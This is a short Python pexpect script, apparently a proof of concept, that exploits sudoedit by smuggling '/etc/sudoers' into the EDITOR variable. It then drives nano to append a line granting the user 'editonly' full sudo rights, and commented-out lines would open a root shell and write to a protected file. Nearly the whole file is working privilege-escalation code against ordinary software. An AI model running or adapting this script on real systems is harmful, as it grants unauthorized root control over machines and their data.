import pexpect
import sys
import time

child = pexpect.spawn("/bin/sh")
# child.logfile = sys.stdout
child.expect('$')
child.sendline('EDITOR="nano -- /etc/sudoers" sudoedit /etc/writable') # the exploit lets you edit sudoers
child.expect('Password:')
child.sendline('editonly') # password
time.sleep(5)

# Run for /etc/sudoers and /etc/writable
for i in range(2):
    child.send("\x1b/") # go to end of file
    time.sleep(1)
    child.sendline("\x0deditonly ALL=(ALL:ALL) ALL") # write payload on new line
    time.sleep(1)
    child.send("\x0F")  # Control + O to save
    time.sleep(1)
    child.send("\x0D")  # Enter to confirm the filename
    time.sleep(1)
    child.send("\x18")  # Control + X to exit
    time.sleep(1)

# Run a root shell as user editonly and write to a protected file as
# proof of root permissions
# time.sleep(4)
# child.expect('$')
# child.sendline('sudo -s')
# child.expect('#')
# child.sendline('echo "I shouldn\'t be able to write to this file!" > /etc/admin-only')
